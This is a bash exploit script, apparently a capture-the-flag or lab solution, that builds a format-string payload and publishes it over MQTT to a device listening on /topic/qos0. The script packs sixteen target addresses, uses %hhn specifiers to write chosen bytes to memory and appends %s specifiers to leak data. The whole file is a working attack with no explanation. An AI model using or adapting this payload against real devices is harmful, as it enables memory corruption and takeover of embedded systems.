#!/bin/bash

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

newline=$(echo "0a0d" | xxd -p -r)

addr1="$(echo 0101f83f | xxd -p -r)" # 0x3ff80101
addr2="$(echo 0201f83f | xxd -p -r)" # 0x3ff80102
addr3="$(echo 0301f83f | xxd -p -r)" # 0x3ff80103
addr4="$(echo 0401f83f | xxd -p -r)" # 0x3ff80104
addr5="$(echo 0501f83f | xxd -p -r)" # 0x3ff80105
addr6="$(echo 0601f83f | xxd -p -r)" # 0x3ff80106
addr7="$(echo 0701f83f | xxd -p -r)" # 0x3ff80107
addr8="$(echo 0801f83f | xxd -p -r)" # 0x3ff80108
addr9="$(echo 0901f83f | xxd -p -r)" # 0x3ff80109
addr10="$(echo 0a01f83f | xxd -p -r)" # 0x3ff8010a
addr11="$(echo 0b01f83f | xxd -p -r)" # 0x3ff8010b
addr12="$(echo 0c01f83f | xxd -p -r)" # 0x3ff8010c
addr13="$(echo 0d01f83f | xxd -p -r)" # 0x3ff8010d
addr14="$(echo 0e01f83f | xxd -p -r)" # 0x3ff8010e
addr15="$(echo 0f01f83f | xxd -p -r)" # 0x3ff8010f
addr16="$(echo 1001f83f | xxd -p -r)" # 0x3ff80110

addresses=$addr1$addr2$addr3$addr4$addr5$addr6$addr7$addr8$addr9$addr10$addr11$addr12$addr13$addr14$addr15$addr16

inject1="%25x%6\$hhn"
inject2="%22x%7\$hhn"
inject3="%262x%8\$hhn"
inject4="%171x%9\$hhn"
inject5="%321x%10\$hhn"
inject6="%17x%11\$hhn"
inject7="%243x%12\$hhn"
inject8="%187x%13\$hhn"
inject9="%328x%14\$hhn"
inject10="%249x%15\$hhn"
inject11="%258x%16\$hhn"
inject12="%8x%17\$hhn"
inject13="%250x%18\$hhn"
inject14="%255x%19\$hhn"
inject15="%189x%20\$hhn"
inject16="%223x%21\$hhn"

injection=$inject1$inject2$inject3$inject4$inject5$inject6$inject7$inject8$inject9$inject10$inject11$inject12$inject13$inject14$inject15$inject16

printer="${newline}%6\$s${newline}"

payload=$addresses$injection$printer$printer$printer$printer$printer

echo $payload

$command_prefix "$payload"